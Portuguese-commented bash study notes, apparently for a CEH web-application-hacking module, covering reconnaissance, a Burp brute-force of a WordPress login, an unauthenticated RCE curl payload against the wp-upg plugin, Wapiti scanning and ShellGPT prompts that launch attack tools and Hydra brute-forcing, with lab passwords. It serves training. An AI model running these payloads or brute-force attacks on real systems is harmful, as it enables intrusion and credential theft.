#!/bin/bash



###############
# MOD 14 - Lab 1: Footprint the web infrastructure
###############

########
# TASK 1: Perform web application reconnaissance using Nmap and Telnet
########

# Objetivo: 
#   Coletar informações detalhadas sobre a infraestrutura web do alvo (www.moviescope.com), como IP, DNS, portas, serviços, tecnologias e banners de servidor.

# Whois Lookup – Coleta de informações do domínio
#   Ferramentas sugeridas:
#       Netcraft
#       SmartWhois
#       DomainTools
#       Batch IP Converter
#   Objetivo:
#       Descobrir:
#           Nome do registrante
#           E-mails de contato
#           DNS primário/secundário
#           IP público
#           Localização
#           Organização responsável
#   Ação esperada:
#       Inserir www.moviescope.com e obter todos os dados de domínio e IP.

# DNS Interrogation – Interrogação e enumeração de DNS
#   Ferramentas sugeridas:
#       DNSRecon
#       Domain Dossier
#   Objetivo:
#       Coletar informações como:
#           Registros A, MX, NS, TXT, SRV
#           Subdomínios
#           Zone Transfers (AXFR)
#           Servidores DNS responsáveis
#           Serviços internos revelados por SRV
# Comando exemplo com DNSRecon:
dnsrecon -d moviescope.com

# Port & Service Discovery com Nmap
#       Máquina usada: Parrot Security
#       Alvo: www.moviescope.com (Windows Server 2019)
#   Comando usado:
sudo su
#   senha: toor
nmap -T4 -A -v www.moviescope.com
#   Explicação dos parâmetros:
#       -T4: Aumenta a velocidade da varredura (tempo/agressividade).
#       -A: Varredura agressiva (detecta OS, versões, traceroute e scripts NSE).
#       -v: Modo verboso (mostra mais informações).
#   Resultado esperado:
#       Portas abertas (80, 443, 21, etc.)
#       Serviços detectados (Apache, IIS, FTP, SSH...)
#       Sistema operacional (ex: Windows Server 2019)
#       Endereço MAC
#       Nome NetBIOS, domínio e hostname
#       Tecnologias: ASP.NET, PHP, etc.

# Banner Grabbing com Telnet
#   Comando usado:
telnet www.moviescope.com 80
#   Conecta ao servidor HTTP na porta 80.
#       Após conectar:
GET / HTTP/1.0
#       Pressionar duas vezes Enter após o comando.
#   Resultado esperado:
#       Cabeçalhos HTTP da resposta, incluindo:
#           Server: Microsoft-IIS/10.0
#           X-Powered-By: ASP.NET
#           Outras informações como cookies, métodos suportados, etc.
#   Finalidade:
#       Revelar a tecnologia de backend usada pela aplicação web (IIS, Apache, Nginx...).
#       Identificar possíveis vetores de ataque (ex: versões vulneráveis do IIS).

# (Opcional) Firewall Detection via Nmap
#   Nmap inclui isso na opção -A automaticamente.
#   Mas também pode-se usar --script firewall-bypass ou observar respostas inconsistentes.

# Conclusão
#   Através dessa série de técnicas e ferramentas, você:
#       Coletou informações do domínio com WHOIS
#       Descobriu registros DNS e servidores relacionados
#       Escaneou portas abertas e identificou serviços com Nmap
#       Descobriu a tecnologia e versão do servidor web com Telnet
#       Iniciou o processo de footprinting necessário para exploração futura



########
# TASK 2: Perform web spidering using OWASP ZAP
########

# Objetivo:
#   Realizar web spidering (ou web crawling) no site-alvo www.moviescope.com, a fim de...
#   Descobrir URLs ocultas, funcionalidades não mapeadas, arquivos sensíveis e potenciais vetores de ataque.

# O que é Spidering?
#   Spidering é o processo automatizado de navegar e mapear todas as páginas e recursos acessíveis de um site através de seus links internos, JavaScript, formulários, etc.
#   Um spider (aranha digital):
#       Rastreia links, formulários e ações dinâmicas;
#       Ajuda a identificar conteúdo oculto ou não referenciado;
#       Serve de base para escaneamento ativo posterior.

# Ferramenta utilizada: OWASP ZAP
#   ZAP (Zed Attack Proxy) é uma ferramenta gratuita de testes de segurança mantida pela OWASP. 
#   Usada para encontrar vulnerabilidades em aplicações web durante a fase de footprinting e pentest.

# Acessar terminal como root
sudo su
# senha: toor
#   Necessário para rodar o ZAP com permissões de sistema.

# Ir para o diretório root (opcional)
cd
#   Apenas para garantir que você está na pasta base do usuário root.

# Iniciar o ZAP Proxy
zaproxy
#   Esse comando inicia a interface gráfica do OWASP ZAP.
#   Se não abrir: Certifique-se que o Parrot Security possui ambiente gráfico ativado e o ZAP instalado.

# Configurações iniciais do ZAP GUI
#   Ao iniciar:
#       Quando perguntado sobre salvar a sessão → Selecione:
#           "No, I do not want to persist this session at this moment in time"
#   Feche a janela de Manage Add-ons se aparecer.

# Executar escaneamento automático (inclui spidering)
#   Vá até a aba Quick Start
#   Clique em: Automated Scan
#   No campo URL to attack, digite:
http://www.moviescope.com
#   Clique no botão Attack
#   O ZAP irá:
#       Fazer o spidering automático (varredura de links);
#       Em seguida, iniciar o Active Scan (opcional para este lab).

# Observar a aba "Spider"
#   Navegue até a aba Spider (parte inferior da tela).
#   Ali você verá:
#       URLs descobertos (inclusive os não visíveis no menu do site);
#       Parâmetros de formulários;
#       Requisições GET e POST usadas no site.

# Ver mensagens capturadas
#   Dentro da aba Spider, clique na subaba Messages
#   Exibe:
#       Requisições HTTP completas (cabeçalhos, parâmetros, cookies);
#       Caminhos acessados;
#       Status HTTP (200, 302, 404...).

# Informações úteis que o spidering pode revelar
#   Diretórios restritos	            /admin/, /config/, /backup/
#   Arquivos sensíveis	                .bak, .old, .log, .sql
#   Funcionalidades ocultas	            /dev/, /test/, /beta/
#   Endpoints internos	                /api/v1/users, /api/debug
#   Formulários de login ou busca	    <form action="/login">
#   Comentários HTML reveladores	    <!-- TODO: disable debug mode -->

# Conclusão
#   Ao final desta etapa, com o OWASP ZAP você obteve:
#       Um mapa completo das URLs públicas e ocultas da aplicação web
#       Acesso a requisições e respostas HTTP detalhadas
#       Fundamento para próximas fases do pentest (exploração e validação de falhas)



########
# TASK 3: Perform web application vulnerability scanning using SmartScanner
########

# Objetivo:
#   Realizar uma varredura automatizada de vulnerabilidades no site www.moviescope.com usando a ferramenta SmartScanner
#   Identificar falhas de segurança exploráveis com apoio de inteligência artificial.

# O que é um Web Application Vulnerability Scanner?
#   Um scanner de vulnerabilidades para aplicações web é uma ferramenta que automatiza a busca por falhas como:
#       Transmissão insegura de dados (HTTP sem TLS),
#       Cabeçalhos de segurança ausentes,
#       Campos de entrada vulneráveis a ataques (XSS, SQLi, etc),
#       Arquivos sensíveis expostos,
#       Más práticas de desenvolvimento.

# Ferramenta utilizada: SmartScanner
#   O SmartScanner utiliza inteligência artificial para:
#       Detectar páginas vulneráveis;
#       Adaptar a análise ao comportamento do alvo;
#       Reduzir falsos positivos;
#       Descobrir caminhos ocultos e pontos de entrada;
#       Fazer fingerprinting e calcular níveis de risco.

# Acessar máquina Windows 11 da VM
#   No ambiente de laboratório:
#       Clique em Windows 11 para trocar para essa VM.
#       Pressione Ctrl + Alt + Delete.
#       Faça login com:
#           Usuário: Admin
#           Senha: Pa$$w0rd

# Localizar e abrir o SmartScanner
#   Clique no ícone de lupa / search na área de trabalho.
#   Digite:
smartscanner
#   Clique em Open para iniciar o SmartScanner.

# Inserir o site-alvo e iniciar escaneamento
#   No campo:
Enter site address to scan
#   digite:
www.moviescope.com
#   Clique no botão Scan.

# Acompanhar o progresso da varredura
#   O SmartScanner iniciará o escaneamento com técnicas de fingerprinting, varredura de cabeçalhos HTTP, análise de input vectors, e verificação de protocolos inseguros.

# Analisar as vulnerabilidades encontradas
#   Após o escaneamento, será exibida a seção:
Found Issues
#   Com as colunas:
#       Vulnerabilidade encontrada
#       Severidade (Alta, Média, Baixa)
#       Link para a URL vulnerável

# Password Sent Over HTTP
#   Clique no nó Password Sent Over HTTP
#   Clique no link:
http://www.moviescope.com
#   A aba da direita exibe:
#       DESCRIPTION: Explica que senhas estão sendo enviadas em HTTP não criptografado, facilitando sniffing e interceptação de credenciais.
#       RECOMMENDATION: Sugere o uso de HTTPS.
#       REFERENCES: Contém o link CWE-319, que leva ao site oficial CWE com a descrição técnica da falha.
#   Ação:
#       Ctrl + clique no link CWE-319 para abrir no Microsoft Edge.

# X-Frame-Options Header is Missing
#   Vulnerabilidade de Clickjacking.
#   Ausência do cabeçalho de segurança X-Frame-Options permite que o site seja embutido em um <iframe>, possibilitando sobreposição de elementos para enganar o usuário.
#   Ação:
#       Clique no nó correspondente e visualize:
#           Descrição, Recomendação (usar o cabeçalho com valor DENY ou SAMEORIGIN), e
#           Link de referência técnico.

# X-Content-Type-Options Header is Missing
#   Falha de MIME sniffing.
#   Quando o navegador tenta adivinhar o tipo de conteúdo, arquivos que não deveriam ser executados podem ser tratados como executáveis (ex: scripts).
#   Ação:
#       Ver detalhes da vulnerabilidade.
#       Recomendação: Adicionar o cabeçalho:
X-Content-Type-Options: nosniff

# Outras Ações e Recursos Possíveis
#   Você pode:
#       Clicar em qualquer outra vulnerabilidade na árvore de resultados para:
#           Ver descrição detalhada
#           Ler recomendações técnicas
#           Acessar os links do CWE para entender a origem da falha

# Conclusão
#   Ao final desta etapa, com o SmartScanner, você:
#       Descobriu vulnerabilidades reais em www.moviescope.com
#       Teve acesso às descrições técnicas e recomendações práticas
#       Aprendeu a usar referências como CWE para estudo aprofundado
#       Estudou como IA aplicada pode otimizar a varredura e reduzir falsos positivos


###############
# MOD 14 - Lab 2: Perform web application attacks
###############


########
# TASK 1: Perform a brute-force attack using Burp Suite
########

# Objetivo
#   Executar um ataque de força bruta contra um login WordPress para descobrir credenciais válidas
#   Utilizar o Burp Suite (ferramenta de análise de segurança para aplicações web).

# Ferramentas e Ambientes Utilizados
#   Host Atacante	    Parrot Security OS
#   Alvo	            WordPress rodando em Windows Server 2022 via WampServer
#   Site Alvo	        http://10.10.1.22:8080/CEH/wp-login.php
#   Ferramenta	        Burp Suite Community Edition
#   Wordlists	        username.txt e password.txt com combinações para brute-force

# Fluxo Resumido do Ataque
#   Ativar o ambiente vulnerável (WampServer no Windows Server 2022)
#   Redirecionar o tráfego do navegador pelo Burp Suite (Proxy)
#   Capturar e enviar o request de login para o Burp Intruder
#   Definir posições dos campos username e password
#   Carregar listas de payloads (usuários e senhas)
#   Executar o ataque (modo Cluster Bomb)
#   Identificar credenciais válidas por status de resposta HTTP
#   Testar credenciais no site alvo

# Ativar o WampServer no Alvo
#   Entrar no Windows Server 2022:
#       Usuário: CEH\Administrator
#       Senha: Pa$$w0rd
#   Iniciar o wampserver64 e aguardar o ícone verde (todos os serviços ativos).

# Acessar a Aplicação Web Alvo (WordPress)
#   No Parrot OS:
#       Abrir Firefox.
#       Acessar: 
http://10.10.1.22:8080/CEH/wp-login.php

# Configurar o Proxy no Navegador
#   Firefox → Menu → Settings → Network Settings:
#       Escolher: Manual proxy configuration
HTTP Proxy: 127.0.0.1
Port: 8080
[x] Also use this proxy for HTTPS

# Iniciar o Burp Suite
#   Caminho: Applications → Web Application Analysis → Web Application Proxies → Burpsuite CE
#   Aceitar os termos e iniciar como Temporary Project
#   Selecionar: Use Burp defaults → Start Burp

# Capturar Requisição de Login
#   Voltar ao Firefox e inserir:
#       Username: admin
#       Password: password
#   Pressionar "Log In"
#   No Burp Suite, garantir que o Intercept está ativado (Intercept is on)
#   Requisição HTTP capturada → Clicar com botão direito → Send to Intruder

# Configurar Intruder no Burp
#   Limpar Posições Automáticas
#       Aba Intruder → Positions → Clicar em Clear §
#   Selecionar "Cluster bomb" como Attack type
#   Selecionar campos e adicionar §
#       Selecionar admin → clicar Add §
#       Selecionar password → clicar Add §

# Carregar Wordlists para Payloads
#   Payload 1: Usuários
#       Aba Payloads → Payload set: 1 → Type: Simple list
#       Load… → selecionar username.txt
#   Payload 2: Senhas
#       Payload set: 2 → Type: Simple list
#       Load… → selecionar password.txt

# Executar o Ataque
#   Clicar em Start attack
#   Confirmar pop-up
#   Aguardar o progresso (ataque em execução)

# Analisar os Resultados
#   Verificar colunas Status e Length
#   Exemplo de resposta de sucesso:
#       Status = 302 (Redirect)
#       Length = 1155
#   Confirmação no Raw Request:
#       Username: admin
#       Password: qwerty@123

# Testar Credenciais no Site
#   Voltar ao Firefox
#   Remover proxy (Settings → No proxy)
#   Acessar: 
http://10.10.1.22:8080/CEH/wp-login.php
#   Inserir:
#       admin / qwerty@123
#   Acesso concedido ao painel do WordPress!

# Resumo Técnico das Ações Realizadas
#   Análise	        Interceptação do POST de login com Burp
#   Alvo	        Site WordPress vulnerável (/wp-login.php)
#   Ataque	        Brute-force (Cluster Bomb - 2 payload sets)
#   Wordlists	    username.txt e password.txt
#   Resultado	    Credenciais válidas obtidas: admin : qwerty@123
#   Impacto	        Acesso completo ao painel da aplicação

# Conceitos Aplicados no Lab
#   Proxy interceptador: captura requisições HTTP/HTTPS para manipulação.
#   Força bruta com múltiplos payloads: combinação de usuários e senhas.
#   Códigos HTTP úteis:
#       200: resposta comum (login falhou).
#       302: redirecionamento após sucesso (indicador de login válido).

# Boas Práticas de Documentação
#   Capturar screenshots das requisições e respostas.
#   Registrar combinações testadas e tempos de resposta.
#   Descrever como a aplicação responde a logins inválidos vs. válidos.
#   Anexar análise dos headers e cookies (se aplicável).


########
# TASK 2: Perform Remote Code Execution (RCE) attack
########

# Objetivo
#   Realizar um ataque de Execução Remota de Código (RCE) explorando uma falha no plugin wp-upg do WordPress, instalado em uma máquina Windows Server 2022, 
#   Acessar via rede pela máquina atacante Parrot Security OS.

# Na máquina Windows Server 2022 (vítima)

# Iniciar o ambiente alvmakefilCopEdiUsuário: CEH\AdministratoSenha: Pa$$w0rIniciar o WampServer
#   Procurar por wampserver64 no menu iniciar.

# Verificar que o ícone está verde (significa que Apache e MySQL estão ativos).

# Acessar o WordPress e fazer login
#   Acessar:
http://10.10.1.22:8080/CEH/wp-login.php
#   Realizar login com:
#       Usuário: admin
#       Senha: qwerty@123

# Ativar o plugin vulnerável
#   Navegar até:
Plugins > Installed Plugins
#   Ativar o plugin:
User Post Gallery (wp-upg)
#   Na máquina Parrot Security (atacante)

# Obter API Key para o WPScan
#   Acessar: 
https://wpscan.com/
#   Criar/entrar com uma conta gratuita.
#   Obter o API Token no perfil da conta.

# Escanear a aplicação WordPress
#   Abrir terminal e ganhar acesso root:
sudo su
# senha: toor
#   Ir para o diretório raiz (opcional):
cd /
#   Rodar o WPScan:
wpscan --url http://10.10.1.22:8080/CEH --api-token SEU_TOKEN_AQUI
#   Resultado:
#       WPScan retorna os plugins vulneráveis, entre eles wp-upg, com vulnerabilidade RCE não autenticada.

# Explorar a vulnerabilidade (RCE) via cURL
#   Executar o comando malicioso:
curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'
#   Explicação do comando:
#       Envia uma requisição HTTP GET para admin-ajax.php, endpoint usado por plugins WordPress.
#       Parâmetros usados:
#           action=upg_datatable ativa uma função do plugin.
#           field=field:exec:whoami:NULL:NULL instrui o plugin a:
#               Usar a função exec() do PHP.
#               Executar o comando whoami no sistema operacional.
#       Retorno esperado: nt authority\system (ou outro usuário do sistema Windows).

# Detalhes Importantes da Falha
#   Tipo de vulnerabilidade: RCE (Remote Code Execution)
#   Plugin vulnerável: wp-upg
#   Exploração via: admin-ajax.php + parâmetro exec injetado.
#   Autenticação necessária? ❌ Não (vulnerabilidade não autenticada)
#   Impacto: Execução arbitrária de comandos no sistema operacional remoto.

# Checklist Técnico da Tarefa
#   Iniciar WAMP no Windows
#   Acessar WordPress
#   Ativar plugin wp-upg
#   Obter API do WPScan
#   Executar wpscan
#   Identificar vulnerabilidade
#   Executar RCE com curl
#   Observar retorno whoami

###############
# MOD 14 - Lab 3: Detect web application vulnerabilities using various web application security tools
###############


########
# TASK 1: Detect web application vulnerabilities using wapiti web application security scanner
########

# Objetivo
#   Utilizar a ferramenta Wapiti, um scanner de vulnerabilidades web open source, para detectar falhas em um site alvo via teste de caixa preta (black-box testing)
#   Esse tipo de análise simula um atacante externo interagindo com a aplicação, sem acesso ao código-fonte

# Resumo das Vulnerabilidades Detectadas pelo Wapiti
#   O Wapiti é capaz de identificar:
#       Injeção de SQL
#       XSS (Cross-Site Scripting)
#       Comando remoto (Command Injection)
#       Inclusão de arquivos (Local/Remote File Inclusion)
#       Travessia de diretórios (Path Traversal)
#       Exposição de backups, arquivos de log, etc.

# Máquina: Parrot Security OS (atacante)
#   Obter privilégios de root
sudo su
#       Senha padrão: toor
#   Objetivo: Ganhar permissões de superusuário para instalar pacotes, criar ambientes virtuais e modificar diretórios do sistema.

# Acessar o diretório do Wapiti
cd wapiti
#   Objetivo: Navegar até o diretório onde o código-fonte do Wapiti foi extraído ou clonado (geralmente baixado previamente via Git).

# Criar ambiente virtual em Python
python3 -m venv wapiti3
#   Objetivo: Criar um ambiente isolado chamado wapiti3 para instalar o Wapiti e suas dependências, evitando conflitos com o sistema.

# Ativar o ambiente virtual
. wapiti3/bin/activate
#   Objetivo: Ativa o ambiente virtual, permitindo que os próximos comandos usem os pacotes Python locais ao ambiente.

# Instalar o Wapiti
pip install .
#   Objetivo: Instalar o scanner de vulnerabilidades Wapiti a partir do código-fonte presente no diretório atual (.).

# Executar o scan com Wapiti
wapiti -u https://www.certifiedhacker.com
#   Objetivo: Rodar um scan de vulnerabilidades no site alvo.
#   Flag importante:
#       -u: especifica a URL alvo para o teste.
#   Duração: Pode levar cerca de 10 minutos, pois o Wapiti faz crawling e executa testes em cada parâmetro/formulário identificado.

# Acessar diretório dos relatórios
cd /root/.wapiti/generated_report/
#   Objetivo: Navegar até o local onde o Wapiti salva automaticamente os relatórios gerados.

# Verificar o nome do relatório HTML
ls
#   Objetivo: Listar os arquivos HTML com nome baseado na URL e timestamp. Exemplo:
certifiedhacker.com_20250626_1122.html

# Copiar o relatório para pasta de usuário
cp certifiedhacker.com_20250626_1122.html /home/attacker/
#   Objetivo: Copiar o arquivo HTML para um local acessível pelo navegador sem permissões root.

# Abrir o relatório no navegador
firefox certifiedhacker.com_20250626_1122.html
#   Objetivo: Abrir o relatório gerado no Firefox para visualizar:
#       Vulnerabilidades descobertas
#       Parâmetros afetados
#       Severidade de cada falha
#       Sugestões de correção

# Checklist Técnico
#   Ativação do root
#   Criação e ativação de ambiente Python
#   Instalação do Wapiti
#   Execução do scanner
#   Acesso ao relatório HTML
#   Visualização em navegador

# Conceitos Reforçados
#   Wapiti	                        Scanner DAST que simula ataque real externo a aplicações web
#   Ambiente virtual (venv)	        Isola pacotes e dependências de projeto Python
#   Relatório em HTML	            Arquivo navegável contendo as falhas detectadas pelo scanner
#   Diretório ~/.wapiti	            Onde ficam armazenados relatórios e dados das varreduras anteriores
#   DAST	                        Dynamic Application Security Testing: teste com a aplicação já em execução


###############
# MOD 14 - Lab 4: Perform Web Application Hacking using AI.
###############

########
# TASK 1: Perform web application hacking using ShellGPT.
########

# Objetivo
#   Demonstrar como utilizar ShellGPT (uma interface de IA via terminal) para automatizar tarefas de web application hacking, como:
#       Detecção de WAF
#       Fingerprinting de tecnologias
#       Scans de vulnerabilidades
#       Enumeração de diretórios
#       Ataques de força bruta (bruteforce)
#       Geração de scripts customizados
#       Testes de fuzzing

# Configuração Inicial do Ambiente
#   Acessar máquina Parrot Security	        Selecionar via GUI
#   Login	                                Usuário: attacker, Senha: toor
#   Tornar-se root	                        sudo su, Senha: toor
#   Iniciar ShellGPT	                    bash sgpt.sh
#   Durante o script sgpt.sh, será solicitada a AI Activation Key (obtida no módulo 00).

# Comandos ShellGPT e Suas Finalidades
#   Cada comando abaixo é digitado com o prefixo sgpt --shell "..." ou sgpt --chat wah --shell "...".

# Verificar WAF (Web Application Firewall)
sgpt --shell "Check if the target url www.certifiedhacker.com has web application firewall"
#   Função: Detecta se o site tem proteção via WAF usando técnicas heurísticas.

# Detectar WAF com ferramenta específica (wafw00f)
sgpt --shell "Check if the target url https://www.certifiedhacker.com is protected with web application firewall using wafwoof"
#   Função: Usa a ferramenta wafw00f para identificar o WAF implementado.

# Verificar Load Balancer
sgpt --shell "Use load balancing detector on target domain yahoo.com."
#   Função: Detecta se há balanceamento de carga (load balancing) no domínio. Pode usar técnicas como análise de TTL, headers HTTP, e DNS.

# Identificar tecnologias da aplicação (WhatWeb)
sgpt --chat HWA --shell "Launch whatweb on the target website www.moviescope.com to perform website footprinting. Run a verbose scan and print the output. Save the results in file whatweb_log.txt."
#   Função: Usa WhatWeb para detectar CMS, frameworks, plugins, e servidores em uso.

# Scanner de Vulnerabilidades Genérico
sgpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com"
#   Função: Executa varredura genérica usando ferramentas disponíveis (ex: Nikto, Nmap com scripts NSE, etc.).

# Scanner com Nmap
sgpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com using nmap"
#   Função: Usa Nmap com scripts NSE (por exemplo: http-vuln-*, http-enum, http-methods) para varredura web.

# Scanner com Sn1per
sgpt --shell "Use Sn1per tool and scan the target url www.moviescope.com for web vulnerabilities and save result in file scan3.txt"
#   Função: Usa a suíte Sn1per para automatizar footprinting e scanning.

# Enumeração de conteúdo com Dirb
sgpt --shell "Scan the web content of target url www.moviescope.com using Dirb"
#   Função: Usa Dirb para encontrar diretórios e arquivos ocultos via brute force.

# Enumeração de diretórios com Gobuster
sgpt --shell "Scan the web content of target url www.moviescope.com using Gobuster"
#   Função: Enumeração de diretórios com Gobuster, mais rápido que Dirb e com suporte a várias wordlists.

# Ataque FTP Bruteforce com Hydra
sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"
#   Função: Usa Hydra para bruteforce de login FTP.

# Script Customizado de Hacking com IA
sgpt --chat wah --shell "create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com"
#   Função: ShellGPT cria um script (em Bash ou Python) com funções como:
#       Detecção de servidor
#       Enumeração de diretórios
#       Scan de vulnerabilidades

# Criar Script Python Personalizado
sgpt --chat wah --shell "create and run a custom python script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com"
#   Função: Cria um script Python que automatiza footprinting (ex: headers, tecnologias, etc.) e scanning com tools como Nmap ou Wapiti.

# Script Completo com Análise + Exploração
sgpt --chat wah --shell "create and run a custom python script which will run web application footprinting tasks to gather information and then use this information to perform vulnerability scanning on target url is www.certifiedhacker.com"
#   Função: Mesma lógica do anterior, mas o script se adapta às descobertas da fase de enumeração (inteligência ofensiva).

# Fuzz Testing com Wfuzz
sgpt --shell "Fuzz the target url www.moviescope.com using Wfuzz tool"
#   Função: Usa Wfuzz para tentar identificar vulnerabilidades através de fuzzing de parâmetros (XSS, SQLi, etc.).

# Ferramentas Automatizadas Utilizadas pelo ShellGPT
#   Wafw00f	                Detectar WAF
#   WhatWeb	                Fingerprinting da aplicação web
#   Nmap	                Scan de vulnerabilidades e serviços
#   Sn1per	                Scanner ofensivo automatizado
#   Dirb/Gobuster	        Descoberta de conteúdo web
#   Hydra	                Bruteforce de serviços (ex: FTP)
#   Wfuzz	                Fuzzing inteligente de parâmetros
#   Python/Bash Scripts	    Automatização customizada de ataques


# Dicas para Relatórios e Pós-Lab
#   Tire screenshots de:
#       Comando digitado
#       Execução (prompt “E” e saída do terminal)
#       Resultado salvo (ex: whatweb_log.txt, scan3.txt)
#       Scripts gerados
#       Vulnerabilidades encontradas
#   Documente:
#       Ferramenta utilizada
#       Tipo de vulnerabilidade detectada
#       Comando ShellGPT que gerou a análise
#       Caminho dos arquivos salvos